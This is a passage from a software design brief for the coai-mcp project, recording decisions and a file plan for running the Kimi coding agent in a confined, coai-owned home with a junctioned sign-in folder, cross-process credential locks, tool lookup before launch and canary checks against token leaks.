- `src_mcp/runners/Processes/ProcessEnvironment.cs:42-46` (`NameComparer` / `ComparerFor`), `:81-88` (`MinimalWindows` —
  it already NAMES `PATH`, `USERPROFILE`, `HOMEDRIVE`, `HOMEPATH`; the values change, the names do not), `:94` (`Minimal`);
  `src_mcp/runners/Processes/ProcessLauncher.cs:100` (`InheritsEnvironment`), `:112` (`Passthrough`), `:133-139`
  (`ProcessResult`), `:143-146` (`IProcessLauncher`) — a request's `Environment` is applied LAST, on top of the
  passthrough, so an explicit `PATH` wins over the inherited one.
- `src_mcp/runners/Reviewers/CodexConfigFile.cs:18-26` (`RootKey`: basic / literal / bare), `:45-62` (`RootValue`, stops
  at the first `[`), `:64-67` (`ValueOf`). Brief §4 widens it with table reads — never a second parser.
- `src_mcp/runners/Acp/KimiAcpProfile.cs` — `ProfileName` `:27`; `Exclusions` `:34` (E4.3's); `Failures` `:37-54`;
  `InstalledExecutable` `:71-76` (reads `SpecialFolder.UserProfile` — NEVER called inside a redirected process, decision
  4); `InstalledExecutableFor` `:93-98` (pure — the parent calls THIS with the real profile). `MeasuredVersions` does not
  exist yet (brief §11).
- `src_mcp/runners/Vibe/VibeHomeManifest.cs:31-36` (`Resource`, `Builtin`), `:70-81` (`Load`), `:96-123` (nullable JSON
  records + the source-generated context) and `src_mcp/runners/CoaiMcp.Runners.csproj:36` (the `EmbeddedResource` line):
  `shared/kimi-model-blocks.json` is embedded and read the same way (brief §6).
- `src_mcp/runners/Files/HeldFile.cs:41-55` (`Take` → `Hold.Taken | Busy | Unusable`), `:87-100` (`TakeWithin`, synchronous
  sleeps); `src_mcp/src/Server/Consultation/ConsultantPlaces.cs:95-100` (`LockWait`, `TakingTheLock` =
  `Task.Run(() => HeldFile.TakeWithin(path, LockWait), ct)` — the async shape the credentials lock repeats), `:201-221`
  (the lock taken under the in-process turn, given back on every way out but one); `src_mcp/src/Server/Consultation/ConversationFolder.cs:43`
  (`LockName`), `:82` (`TakeTurn`); `src_mcp/runners/Reviewers/EngineLease.cs:47-50` (`Directory` =
  `LocalApplicationData/coai-mcp/engines`, settable — the lock root's precedent and parent folder).
- `src_mcp/runners/Consultation/ConsultantHomes.cs:21-24` (`Kimi = "coai-kimi"`, `All`) and `src_mcp/src/Server/PanelSettings.cs:385-389`
  (`ConsultantHomesRoot`: `COAI_CONSULTANT_HOMES` else `LocalApplicationData`): the D20 sweep WALKS every child of
  `<root>/coai-kimi/` (`ConsultantHomeSweep.cs:89-106`), so the lock root is NOT under it (decision 1).
- `src_mcp/runners/Platform/HostKind.cs:17-24` (`HostKind`), `:30-31` (`Current`), `:46-53` (`Word`);
  `src_mcp/runners/Reviewers/VendorDiagnosis.cs:282` (`InstallCure(runtime, linux?)` — E4.4 adds the `kimi` arm; until
  then it answers null and this story's sentence falls back to the getting-started URL).
- `src_mcp/runners/Reviewers/ReviewerRuntime.cs:9-12` (`ReviewerSettings.ExecutablePath`), `:186` (`OwnedScratch`).
- `src_mcp/runners/Acp/AcpClient.cs:36-56` (`AskAsync` → `AcpTransport.Start`), `src_mcp/runners/Acp/AcpTransport.cs:87-88`
  (inherits), `src_mcp/runners/Acp/AcpOutcome.cs:9` (`AcpAsk`) — E4.3's seam, named so this story's `Built` and
  `EnvironmentRefusal` signatures fit it (decision 4).
- `src_mcp/runners/Processes/ExecutableResolver.cs:20-85` (`Resolve(command, isWindows, pathVariable, fileExists)`: the
  name as given, then each `PATHEXT` suffix, per `PATH` directory) — the rule `KimiTools` resolves `rg`/`fd` by.
- Tests to mirror: `src_mcp/tests/VibeLaunchControlTests.cs:48-80` (the `FakeVibe` launcher: records every request,
  answers `--version`, the `WhileTheVersionIsAsked` seam, `MostAtOnce`), `src_mcp/tests/VibeHomeTests.cs:47-60`
  (`TheInventoryVibeWrites` — the admitted-inventory companion every refusal needs),
  `src_mcp/tests/AnUnmeasuredVibeIsWarnedAboutNotRefusedTests.cs:21-27` (Vibe's warning asserted by `Contain`; it stays
  green UNTOUCHED, which is S2.32's proof of decision 3), `src_mcp/tests/KimiAcpProfileTests.cs:28-43`.
- The probe's measured shapes: `scripts/lib/kimi-home.mjs:29-41` (`personsOauth`), `:49-60` (`minimalConfigToml` — the
  rung-3 bytes), `:177-185` (`builtEnv`: the four OS-home values from one folder, `HOMEDRIVE`/`HOMEPATH` split from it);
  `research/RESULTS_kimi_confinement.md` §17 (the ladder), §18 (admitted names), §19 (the redirect), §20 (the pin), §22
  (per-id blocks), §24.

**Decisions (Fable, 2026-10-14) — deviations 9, 11 and 12 of §"Where the parent plan and the code disagree".**

1. **The cross-process gate is a `HeldFile` lock, not a named mutex** (deviation 9). A `Mutex` is thread-affine:
   `TakeAsync` awaits the version probe and the validation, resumes on whatever thread the pool gives it, and
   `ReleaseMutex` from another thread throws `ApplicationException` — the lock would be released by the finalizer at
   process exit, i.e. never. `HeldFile` is the repository's one cross-process primitive, kernel-released on a crash,
   already waited for asynchronously by `ConsultantPlaces.TakingTheLock`. **Path:** `KimiCredentialsLock.Root` =
   `<LocalApplicationData>/coai-mcp/kimi-locks/` (beside `EngineLease.Directory`'s `engines/`; settable for tests), the
   file `<SHA-256 of the normalised target path, lower hex, first 16>.lock`. NOT under `coai-kimi/` (the D20 sweep walks
   every folder there and would judge a `locks/` a foreign conversation folder) and NOT in temp (no sweep ever takes it;
   the files are empty and reused per target). **Timing:** inside the row's timeout, as D19 states — a loop of
   `await Task.Run(() => HeldFile.TakeWithin(path, Slice), ct)` with `Slice = 1 s` until `Taken` or the launch's token
   fires (the `OperationCanceledException` the executor already reads as the row's end); `Unusable` → a refusal naming
   the cause and the path. **Order:** the home's in-process turn first (narrow, cheap), the credentials lock second
   (wide), both held by the `LaunchTurn` until the launch is read, released in reverse. No cycle: the D20 sweep and
   `ConsultantPlaces` take only `coai-turn.lock` and the in-process turns, with no wait, and never this lock.
2. **`rg` and `fd` are found BEFORE the launch, or it is refused — never admitted into the home** (deviation 11). D19's
   `PATH` guarantee assumed Moonshot's installer ships them; it does not (item 4 of §"disagree"). Two answers weighed:
   (a) admit `bin/rg.exe` by a hash coai pins — coai never measured Kimi's download (§25: unmeasured), the pinned hash
   would be of a ripgrep release coai never ran, and the owned home would hold code vouched for by a hash KIMI checks,
   which is the alternative D19 itself rejected; (b) find the tools on the person's machine first and refuse otherwise —
   the owned home then never holds code, the person's own `rg` is what their own `kimi` already runs, and the cure is two
   documented commands. (b). **The rule:** `rg` and `fd` (each resolved the `ExecutableResolver` way — the name, then
   each `PATHEXT` suffix) must each be found in the person's `bin` (`KIMI_INSTALL_DIR` else `~/.kimi-code`, plus `/bin`)
   or in a directory of the PARENT's `PATH`; the built `PATH` = the person's `bin`, then the directory of each tool found
   elsewhere (deduplicated, `rg` then `fd`), then the parent's entries not already listed — so `PATH` still BEGINS with
   the person's `bin` (D19) and both tools resolve without a download. One or both missing → refused before any process:
   `ripgrep (rg) and fd were not found in {bin} or on PATH — Kimi's Grep and Glob would download them into the
   coai-owned home, which coai refuses (D19); install them — `winget install --id BurntSushi.ripgrep.MSVC -e` and
   `winget install --id sharkdp.fd -e`, the two steps the panel's Install button for Kimi runs — and restart the editor;
   or run kimi once in a terminal and use its search, which downloads both into {bin}` — with the missing name(s) in
   place of "rg and fd". Both tools, because Kimi documents downloading BOTH into `bin/` (§18) and a `bin/` of either
   refuses the next launch (S2.18). *Plan round on #817 (accepted, 2026-10-14): this refusal stays the NET; E4.5's
   Install and Update buttons PROVISION both tools through the projects' own winget packages (E4.5 brief §6), so a fresh
   install's first review never meets this sentence.* M-K12 (c) stays the cell that lets the help claim "never receives
   code".
3. **ONE string builder for both runtimes' version warning** — `VersionWarnings.Unmeasured(runtime, running, measured,
   numbersCover, advised)`; `VibeLaunch.Unmeasured` calls it with Vibe's four fragments and produces today's sentence BYTE
   FOR BYTE (the existing Vibe test proves it untouched); Kimi's reads `Kimi {running} is not a version coai has measured
   (it measured {measured}); it is run anyway, but every confinement number coai has — the write refusals, the owned
   home's inventory, the OS-home redirect (research/RESULTS_kimi_confinement.md) — is {measured}'s — re-run
   `node scripts/probe-kimi-confinement.mjs` with this Kimi to measure it`. The carrier stays `LaunchTurn.Warning`, a
   string (item 2 of §"disagree"): the card and the reviewer line already read it.
4. **The person's paths are resolved ONCE, in the unredirected parent, and travel on the request** — `KimiPlaces`
   (brief §2). The runtime (E4.4) calls `KimiPlaces.Resolve(…)` with the REAL profile and this process's environment;
   the shim (E4.3) calls `KimiPlaces.ForShim(flags["--home"], flags["--persons-bin"])` and NEVER
   `KimiAcpProfile.InstalledExecutable`, `SpecialFolder.UserProfile` or its own `KIMI_CODE_HOME` — inside the shim
   `USERPROFILE` IS `os/`. **The shim's flags, pinned here for E4.3 and E4.4:** `--home <owned ROOT>` (the folder holding
   `home/` and `os/`; `KIMI_CODE_HOME` is `<root>/home`), `--persons-bin <folder>`, `--executable <absolute kimi>`
   (a flag already), and — added 2026-10-15 with decision 10 — `--locks <KimiCredentialsLock.Root>`, so the shim never
   derives the lock folder from `LocalApplicationData` inside the redirected environment (what `GetFolderPath` answers
   under a redirected `USERPROFILE` is the kind of question this decision exists to never ask). The tool folders need no
   flag: they travel in the shim's own `PATH`, which the same builder made, and `BuiltPath` is idempotent — the agent's
   `PATH` is the shim's `PATH` re-prefixed with nothing new.
5. **The junction's preconditions, make and read-back are E4.1's `Junctions`** — this story calls
   `Junctions.Make(host, <root>/home/credentials, <persons home>/credentials)` and `Junctions.Target`, and adds nothing
   of its own.
6. **The config is RENDERED from values, never copied; `type` must be `kimi` and `storage` must be `file`** — two
   refusals D19 did not spell out (deviation 12): the measured bytes say `type = "kimi"`, and a slot stored anywhere but
   in files has no credentials folder to junction. The person's `[models."<id>"]` block, when present, must be COMPLETE
   and on `managed:kimi-code`; a block coai cannot read (a multi-line array) refuses with the cure rather than silently
   falling to the pinned table — the person's intent is their block, and a render that ignored it would be a home
   written for other values than their own `kimi` runs on.
7. **`RunsInWsl` is shared, not copied**: moved to `HostKinds.RunsInWsl(executable)` (`HostKind.cs`), `VibeLaunch.HostRefusal`
   calls it; `VibeLaunch`'s tests stay green.
8. **The root may hold more than `home/` and `os/`.** S5's conversation folder (`coai-kimi/<id>`) is a root that also
   holds `tree/`, `coai-conversation.txt` and `coai-turn.lock`; Kimi never reads the root (`KIMI_CODE_HOME` is `root/home`,
   the OS home `root/os`), so the validation judges `home/` whole and `os/` empty, and the root only for being a link.

**Decisions 9–13 (Fable, 2026-10-15) — the junction risk consultation 7de9430b and the E4.1 Opus review, each verified
against the E4.1 code before it was taken; deviation 18 of §"Where the parent plan and the code disagree".**

9. **The lock key is the credentials folder's IDENTITY as the kernel names it, not its spelling** (consultation (a),
   taken, amended). Brief §9 as written hashed `Junctions`' normalised path — `Path.GetFullPath` plus a trimmed separator
   (`Junctions.cs:292`), which folds `..` and `/` but NOT case (`C:\Users\x` and `c:\users\X` hash apart), not an 8.3
   spelling (`RUNNER~1` on a CI runner), and not an ancestor link (`D:\kimi\credentials` reached through a junction
   `D:\kimi` → `C:\Users\x\.kimi-code` is the same folder with a different hash) — two servers given two spellings of
   one sign-in would hold two locks and race the refresh. The key is now the FINAL PATH of the opened folder handle:
   `GetFinalPathNameByHandleW` on a directory handle opened with `FILE_FLAG_BACKUP_SEMANTICS`, the `\\?\` prefix
   stripped — the one primitive this repository already trusts to say what a handle really names (reuse-first, move 1),
   and the kernel spells it with each component's ON-DISK casing and long name, every link on the way resolved.
   **Through a new seam, not through `CanonicalDirectory` as first written** (Opus review of f1983923, B1, verified):
   `HandleRead.CanonicalDirectory` FALLS BACK to `WorktreePaths.Real(root)` (`HandleRead.cs:223`) when the open fails or
   the call answers 0 or too long — per-component link resolution of the SPELLING, case as given, no 8.3 — so a key
   through it would silently be a spelling key exactly in the cases this decision exists for. So `HandleRead` gains
   `internal static string FinalDirectory(string root)` — the handle's final path, or EMPTY when the open fails, the
   call fails, or the host is not Windows — and `CanonicalDirectory` becomes `FinalDirectory(root)` else `Real(root)`,
   staying PRIVATE to `Trust` (brief §16). `KeyFor` and `Resolved` (§17) use `FinalDirectory` only. `ToUpperInvariant`
   on top as the belt (the drive letter, and a volume whose `$UpCase` table folds what the kernel's cache did not); on a
   per-directory case-SENSITIVE folder (`fsutil file setCaseSensitiveInfo`) the belt merges two genuinely distinct
   folders into one key — two sign-ins that wait on each other, the safe direction, and stated. SHA-256 of that, lower
   hex, first 16, `.lock`. Two handles to one folder give one final path, which is the "same target only by handle
   identity" the consultation asked for, expressed as the path the lock file is named by. **Rejected:** keying by volume
   serial + file index (`GetFileInformationByHandle`) — a second import for the same identity, 64-bit where ReFS ids are
   128 (`FileIdInfo` would be a third), and a lock folder nobody can read; the final path answers (a) AND decision 13's
   question with one open. **Fail closed:** a folder the platform cannot name by its handle (the call fails, or the
   path is longer than the buffer) gets no key — `Hold.Unusable` with the cause, and `KimiLaunch` refuses: `the Kimi
   sign-in folder {target} cannot be named by its handle, so coai cannot key its lock — refused (D19)`. Never a silent
   fall-back to the spelling: a key that is sometimes identity and sometimes spelling is two keys.
10. **A running Kimi tree HOLDS the sign-in, kernel-owned, until the last process of it is gone** (consultation (b),
    taken — by an inherited handle, not a job object). Verified: `HeldFile.Take` opens the lock without
    `FileShare.Inheritable` (the open `HeldFile.cs:45`, its catches `:48-55`), so the server's gate dies with the
    server; `ProcessLauncher.Started` (`ProcessLauncher.cs:215-220`) goes through .NET's non-shell `Process.Start`,
    which on Windows calls `CreateProcess` with `bInheritHandles = TRUE` whatever the redirection and passes no
    `PROC_THREAD_ATTRIBUTE_HANDLE_LIST` — every INHERITABLE handle of the starter is inherited, nothing is restricted
    (no job object anywhere in the runners); and `kimi acp` exits on stdin EOF, not on its parent's death. So today a coai-mcp killed mid-turn (the editor closes, the MCP client ends it, a crash) leaves
    the shim and its `kimi` alive and REFRESHING — and the kernel has already released the gate, so the next coai-mcp's
    launch takes it and a second refresher joins the first: M-K14's race, the one D19's serialisation exists to avoid,
    reachable by a restart. **The rule:** two files per target, one duty each. The GATE (`<key>.lock`, brief §9 as
    specified) serialises LAUNCHERS and stays the server's, non-inheritable, as S2.25–S2.28 pin. The TREE HOLD
    (`<key>.tree.lock`) is taken by the SHIM — `coai-mcp --ask-acp`, the process whose only child is `kimi` — with
    `FileShare.Inheritable`, in `AskAcpMode.TurnAsync` immediately before `AcpClient.AskAsync` (which is synchronous up
    to `AcpTransport.Start`, `AcpClient.cs:46` — so there is no `await` between the take and the start) and disposed
    after `AskAsync` returns (its `finally` has awaited `EndAsync`, which awaited `Exited`); `kimi` inherits the handle
    at its start (the launcher's start, above), so the file stays locked while EITHER the shim or the agent lives — a
    shim that died under its agent, an agent that outlived the executor's tree kill (finding G: a grandchild whose
    parent exited is missed by `Kill(entireProcessTree)`), a server that crashed over both. A second shim on the same
    sign-in waits in its `TakeWithin` loop, inside its own deadline (the row's timeout, as D19 states for this wait),
    and exits 69 at the deadline with the sentence `another Kimi started on this sign-in is still running ({path} is
    held) — it ends when its agent does; the turn is given up`. The hold is taken only when `--locks` is given — a
    Kimi profile without it is 65 (decision 4), a test's fake profile without it takes no hold, so no inheritable handle
    ever lives in the test host (review B2 (c)). No handle leaks sideways: the shim starts nothing but `kimi`. **Who
    else holds it is UNMEASURED** (review B3, taken): `kimi.exe` is a native binary of unknown runtime, and whether its
    own children (`rg`, `fd`, a helper, an updater) inherit the handle — and whether any of them can outlive `kimi` —
    is not known; a descendant that did would make every later launch on that sign-in exit 69 and every disposal of its
    home stop, a silent outage. So E4.3's live probe measures the cell before the hold ships as a gate: with real Kimi
    2.1.1, after a normal `EndAsync` the `.tree.lock` is `Free` within ~2 s (S3.14); with the shim killed mid-turn it
    stays `Held` until `kimi` exits and is `Free` within ~2 s after that (S3.17); the numbers go into
    `research/RESULTS_kimi_confinement.md` beside §25's "not measured" line, which names the cell until then. **The same
    hold, per HOME as well** (review M2, taken): a second inheritable file `<root>/coai-tree.lock` is taken at the same
    moment, so a disposal can ask "is a tree alive on THIS home" without opening the sign-in folder (decision 11); Kimi
    never reads the root (decision 8), and `KimiHome.Refusal` judges the root only for being a link, so the file is
    admitted there. **Why not the gate
    itself made inheritable:** the gate is held by the SERVER across the whole turn, and every child the server starts
    in that window — another provider's CLI, `git`, the creds probe — would inherit and hold it until it exits; a
    codex review started beside a Kimi launch would then extend the Kimi lock by its own minutes, for the same server's
    next launch too. **Why not a job object with `KILL_ON_JOB_CLOSE`:** it ends the tree the moment the server dies,
    which is the one moment a `kimi` may be between the refresh request and writing the rotated pair — the kill loses
    the rotation and signs the person out, where the inherited hold lets the orphan finish its refresh cleanly and
    merely makes the next launch wait; it is three imports against one flag; and it is the Windows twin of the Unix
    process-group teardown §0 puts outside this epic. **Residual, stated — and it is EVERY turn, not only a timeout**
    (review M1, verified): `AcpClient.TurnAsync`'s `finally` ends the agent through `transport.EndAsync` on every
    ending, answered ones included (`AcpClient.cs:106-111`): the graceful step is only `session/cancel` plus a quiet
    wait, and `EndTreeFirstAsync` then KILLS the tree before closing stdin (`AcpTransport.cs:217-224`) — so the window
    in which a `kimi` between its refresh request and the write of the rotated pair is killed opens at the end of every
    Kimi turn. Whether it matters is M-K14's to measure: whether `kimi` refreshes only on demand (then an answered turn
    has no refresh in flight at its end) or also at idle or proactively near the 900 s expiry. A Kimi-only grace — close
    stdin, wait briefly for the clean exit EOF gives a well-behaved agent, kill the tree only then — was weighed and is
    NOT taken here: it is the exact order finding G forbids (an agent that exited can no longer name its children, and
    the kill then finds an empty tree), and the tree hold already makes a survivor of that order wait rather than race.
    If M-K14 finds idle refreshes, the grace returns as its own change, with the Windows-only reasoning (no reparenting
    there) measured. A tree ended by the executor's timeout kill, or a power cut, at that instant loses the rotation
    exactly as the person's own `kimi` would; `kimi login` cures it. The person's own interactive `kimi` remains the
    stated race (D19 (ii)).
11. **The teardown's TOCTOU stays a stated limit — and the teardown now refuses to run under a LIVE tree**
    (consultation (c), limit confirmed; one addition). The limit as E4.1 recorded it is real: `DeleteEvenIfReadOnly`
    checks `IsLink(dir)` (`GitScratch.cs:57`) and enumerates by path (`:65`); a real folder swapped for a junction in
    between is entered, and `KimiHome.Dispose` (brief §14) cannot close it from outside — there is no managed
    enumeration by handle, and the NT call that does it is out of scope. The reasoning that makes it a limit rather than
    a gap: the only process that can swap a folder inside coai's owned root is a same-user process, which can open the
    person's `credentials` directly — coai runs with the person's own rights and is no deputy to confuse; Kimi itself
    never makes a link (§18's inventory is data only); and the teardown runs with no launch on the home (the home's
    turn, D20's `coai-turn.lock`). **What was not a limit but a gap, found while confirming it:** the sweep or the
    round's scratch can dispose a home whose `kimi` is still alive — the orphan of decision 10, or a survivor of the
    tree kill — and unlinking `credentials` under a live `kimi` makes its next refresh write the rotated pair into a
    `credentials/` it re-creates as a REAL folder inside coai's home, leaving the person's file with the token the
    server just retired: a sign-out. So `KimiHome.Dispose` step (1) gains, before the unlink, a probe of the PER-HOME
    hold: `HeldFile.Probe(root/coai-tree.lock)` → `Held` → `Stopped("a Kimi started on {root} is still running (its
    tree hold {path} is held) — the home is kept until it ends")`, nothing unlinked; `Free` (the file absent — a home
    that never launched — or released) → on; `Unknown` (the file there but unopenable) → `Stopped` too, because a tree
    file nobody can open is not known to be free, and a kept home costs a beat where a wrong unlink costs a sign-in.
    *Per HOME, not per sign-in* (review M2, taken over the first draft's probe of `<key>.tree.lock`): a per-sign-in
    probe would stop the disposal of every FINISHED home on a sign-in while any other round runs on it — noise, and
    scratch kept for nothing — and would have to re-key at disposal time, opening the sign-in folder from a sweep beat
    (through a retargeted or network ancestor, decision 13), which the E4.1 rule forbids; the home's own file asks the
    exact question with no open of anything outside coai's tree. A kept home is retried by the next beat (the sweep) or
    the next scratch sweep (the round) — the tree ends when `kimi` does.
12. **A canary token in the sign-in never appears in anything coai writes** (E4.1 review, taken as a pin). What coai
    reads of the person's is the config's slot (`KimiPersonsConfig`: `type`, `base_url`, `storage`, `key` — a slot
    NAME, `oauth/kimi-code-env-x`, not a token — `oauth_host`) and the `credentials` folder's entry NAMES (E4.1's
    `Look`, brief §14's `before`/`after`); it never opens a credentials file. The surfaces where a token could still
    travel are every sentence this story composes (refusals, `Stopped`, `LinkTargetLostException`, the version warning),
    the lock file names, the rendered `config.toml`, and the shim's report (`AskAcpMode.Report`, `AskAcpMode.cs:184-208`:
    `answer`, `reason`, `reads[].path/reason`, `toolCalls[].title`) with its stderr. The report's `reads` carry a path and
    a type-named reason, never bytes (`HandleRead.cs:86-87`), and a read of the credentials path — spelled directly or
    through the owned home's junction — is outside the snapshot root and refused by the boundary; what the AGENT then
    says is the vendor's text, so the canary's claim is bounded honestly: a token reaches the agent's answer only if coai
    served it, and S2.45's control arm proves the detector sees a served canary when one is served. **The bound, said
    plainly** (review M4): the agent's stderr (`transport.StdErr` → `AcpOutcome.StdErr` → `AcpDiagnosis.Of(reason +
    stderr)`, `AskAcpMode.cs:102`, and E4.4's records) and whatever `reason` carries of an agent's own error text are
    VENDOR text relayed by coai — outside the pin: coai cannot keep a vendor's process from printing its own file. What
    the pin covers is every string COAI composes. **Who logs:** none of E4.2's runners classes — they answer strings and
    call `warn`/`_note` callbacks (there is no `ILogger` or Serilog under `src_mcp/runners/Vibe`, `Files`, `Acp`); the
    Serilog surface is the server's (`ConsultantHomeSweep`'s `warn` goes to its log, E4.4's executor logs the launch),
    and the shim's `note` is its stderr. So each collector in S2.45 is named with its own liveness check (M4): a
    collector that caught nothing proves nothing. **A second canary** in the person's `config.toml` — the `moonshot-ai`
    row's `api_key` — with a MALFORMED-TOML row (a parse that quotes the offending line is the likeliest leak of a
    config value): `KimiPersonsConfig`'s and `KimiModelBlocks`' refusals name the key and the cure, never the line.
    E4.4 re-runs the same canary through the round's records and the reviewer line once the runtime exists (its coder
    adds the row beside S4.15).
13. **The credentials target's ANCESTORS may be links — admitted, resolved, and refused only when the resolution
    leaves the local drives** (E4.1 review M5, decided; consultation (e)). `Junctions.Chained` (`Junctions.cs:155-157`)
    asks only whether the TARGET is a link, and that stays the rule for the last component: a junction to a junction
    reads back one level (`Target` never chases), so the read-back could not prove what was made. An ancestor link is a
    different thing: `C:\Users` relocated to another drive by junction, a profile on a mounted volume, a `KIMI_CODE_HOME`
    that is itself a junction — common, legitimate, the person's own doing in their own trust domain, and exactly what
    their own `kimi` runs through. Refusing them would refuse real machines for no threat that a same-user link maker
    does not already have. What an ancestor link CAN do that the spelling hides is point off the local drives: a
    directory SYMLINK (Developer Mode) under `C:\…` to `\\server\share` passes `LocalDrive`'s check of `target[..3]`
    (`:67-71`) and E4.1's deleter would then list the target through it on every sweep. So `Junctions.Refusal` gains ONE
    check after `Chained`, at launch time only: `Resolved(target)` — the final path of decision 9's open (`canonical`
    seam for tests); empty → `{target} cannot be named by its handle on this host, so coai cannot tell where the Kimi
    sign-in really is — refused (D19)`; not `IsLocalDrivePath` → `{target} resolves to {final}, which is not a local
    drive path — a link on the way to the Kimi sign-in points at a network or roaming location, and coai refuses to link
    the sign-in from there (D19)`. **How often the ancestor link is traversed — honestly** (review M3, taken; the first
    draft's "once, at launch" was false): `Missing` (`Directory.Exists`, `Junctions.cs:151`) and `Chained`
    (`File.GetAttributes`, `SnapshotLinks.cs:41`) walk through the ancestor before `Resolved` opens it; `KeyFor` opens
    it again in the server's `TakeAsync` and once more in the shim; and E4.1's deleter lists the target before and after
    every unlink of the junction. A symlink to a share is therefore connected to several times per launch and once per
    disposal — by the person's own doing in their own profile, exactly as their own `kimi` connects through it on
    every start — and never from a sweep beat on a link planted in scratch (the disposal's own probe is per home,
    decision 11, and the deleter's listing stays behind E4.1's spelling-only `IsLocal`). What `Resolved` adds is the
    REFUSAL: after it, no owned home is ever made on such a target, so the launches and disposals that would keep
    connecting never happen. A top-down walk reading each ancestor's own link data before `Missing` — a launch that
    connects out zero times — was weighed and not taken: it is a second resolver beside the kernel's for a person who
    has already pointed their own profile at a share; it can return as its own change if a measured case wants it. The
    owned home's junction keeps the SPELLING as its target (one level, D19), so a person who retargets their own
    ancestor junction between two launches lands where their own `kimi` now lands; the lock key (decision 9) follows
    the folder either way.

**BRIEF** (new files under `src_mcp/runners/Kimi/`, the folder E4.4's `KimiRuntime` joins).

1. **`KimiModels.cs`** — `public static class KimiModels { Default = "kimi-code/k3-256k"; Curated (the embedded
   table's ids, in its order); SeenOn = "2.1.1"; PlanPrefix = "kimi-code/" }`. `KimiLaunch.ModelRefusal(model)`: empty
   when curated; an id outside `kimi-code/` → `the model '{m}' is not on the Kimi Code plan (only kimi-code/* ids are:
   {list}); a moonshot-ai/* id bills your own API key, so coai sends nothing (D10)`; a `kimi-code/*` id not curated →
   `the model '{m}' is not one coai has seen Kimi answer — choose one of {list} (D10)`.
2. **`KimiPlaces.cs`** — `public sealed record KimiPlaces(string OwnedRoot, string PersonsHome, string PersonsBin,
   IReadOnlyList<string> ToolFolders, string ToolsRefusal, string Executable)` with `Home => OwnedRoot/home`,
   `Os => OwnedRoot/os`, `Link => Home/credentials`, `Config => Home/config.toml`, `Credentials => PersonsHome/credentials`,
   `PersonsConfig => PersonsHome/config.toml`. `static KimiPlaces Resolve(string ownedRoot, HostKind host,
   Func<string, string?> env, string userProfile, Func<string, bool> fileExists)`: `PersonsHome` = `env("KIMI_CODE_HOME")`
   when non-empty else `userProfile/.kimi-code`; `PersonsBin` = (`env("KIMI_INSTALL_DIR")` non-empty else
   `userProfile/.kimi-code`) + `/bin`; `ToolFolders` / `ToolsRefusal` = `KimiTools.FoldersFor` / `KimiTools.Refusal`
   (decision 2) over `env("PATH")`, `env("PATHEXT")`; `Executable` = `KimiAcpProfile.InstalledExecutableFor(host,
   userProfile, env("PATH"), fileExists)` when it is a path, else the bare name through `ExecutableResolver.Resolve(name,
   host == Windows, env("PATH"), fileExists)` to an ABSOLUTE path, else `kimi` (the launch then fails with the install
   cure). `static KimiPlaces ForShim(string ownedRoot, string personsBin)` → `PersonsHome`, `ToolFolders`, `Executable`
   empty, `ToolsRefusal` empty — it reads NO environment. `HostKind` is a parameter everywhere; `HostKinds.Current` only at
   the runtime's call site (E4.4).
3. **`KimiTools.cs`** — pure: `FoldersFor(bool isWindows, string bin, string? path, string? pathext,
   Func<string, bool> exists)` → the directories (never `bin` itself) where `rg` and `fd` resolve; `Refusal(…)` → the
   sentence of decision 2 naming the missing tool(s), or empty. Resolution per directory: the name, then the name + each
   `PATHEXT` suffix on Windows — reuse `ExecutableResolver`'s per-directory probe if it is extractable (make it
   `internal static`), else a private one with a remark naming the duplication and why.
4. **`CodexConfigFile` widened** (`CodexConfigFile.cs`): `public static string TableValue(string toml, string header,
   string key)` — the lines after the FIRST line that trims to exactly `header` (e.g. `[providers."managed:kimi-code".oauth]`,
   `[models."kimi-code/k3"]`) up to the next line that starts with `[`, matched by `RootKey`; empty when absent.
   `public static IReadOnlyList<string> TableStrings(string toml, string header, string key)` — a ONE-LINE array of basic
   strings `key = [ "a", "b" ]` (whitespace free); empty when absent or of any other form. `public static bool
   HasTable(string toml, string header)`. The remarks gain: *and, for Kimi's config (D19), a key inside ONE named table —
   read for the same reason and with the same "unsure means silent"*. No second parser anywhere.
5. **`KimiPersonsConfig.cs`** — `public sealed record KimiOauthSlot(string Type, string BaseUrl, string Storage, string
   Key, string OauthHost)`; `public abstract record SlotRead { Found(KimiOauthSlot); Refused(string) }` (closed, private
   ctor, the `Hold` shape); `static SlotRead Read(string text, string describedAs)`: no `[providers."managed:kimi-code"]`,
   no `.oauth` table, or an empty `key` / `oauth_host` / `base_url` → `Refused("not signed in to Kimi Code — {describedAs}
   names no managed:kimi-code provider with an OAuth slot; run `kimi login` in a terminal and try again")`; `storage` not
   `file` → `Refused("Kimi's sign-in on this machine is stored as '{s}', not as files (storage = \"file\"), and coai's
   junction sign-in was measured for file storage only — refused as unmeasured (D19)")`; `type` not `kimi` →
   `Refused("the managed:kimi-code provider is type '{t}', not 'kimi' — refused as unmeasured (D19)")`. `static SlotRead
   ReadFile(string path)` — missing or unreadable → the not-signed-in sentence. Nothing else of the file is read:
   `api_key`, `[[hooks]]`, `[services.*]`, the `moonshot-ai` rows never leave it.
6. **`KimiModelBlocks.cs` + `shared/kimi-model-blocks.json`** — `public sealed record KimiModelBlock(string Id, string
   Provider, string Model, long MaxContextSize, IReadOnlyList<string> Capabilities, string Source)`; the JSON
   `{ "why": […], "seenOn": "2.1.1", "blocks": [ … ] }`, one entry per curated id in D10's order: `kimi-code/k3-256k`
   (model `k3-256k`, `maxContextSize` 262144, capabilities `["thinking", "always_thinking", "image_in", "tool_use",
   "dynamically_loaded_tools"]`, source `research/RESULTS_kimi_confinement.md §17 rung 3, 3 of 3`); `kimi-code/k3`
   (`k3`, 262144, the same, `§22, 1 of 1`); `kimi-code/kimi-for-coding` (`kimi-for-coding`, 262144, the same, `§22, 1 of 1
   — the template's 262144 where the owner's own block says 1 048 576`); `kimi-code/kimi-for-coding-highspeed`
   (`kimi-for-coding-highspeed`, 262144, the same, `§22 — the home was accepted; the plan answered 401`). Embedded as
   `CoaiMcp.Runners.kimi-model-blocks.json` (csproj, beside `:36`, with a comment like the manifest's), loaded through a
   source-generated context like `VibeHomeManifestJson` (nullable records, doctrine 4a); a broken file is
   `BlocksLoad.Broken` = a refusal of every Kimi launch, never an empty table. `static BlockRead For(string id, string
   personsConfigText, KimiModelBlocks pinned)`: `HasTable(text, $"[models.\"{id}\"]")` → `provider`, `model`,
   `max_context_size` (a bare integer), `capabilities` (`TableStrings`) — all four present → `Found(block)`; `provider`
   not `managed:kimi-code` → `Refused("your config.toml routes '{id}' through '{p}', which is not the Kimi Code plan —
   coai sends nothing to it (D10)")`; any of the four missing or unreadable → `Refused("your config.toml has a
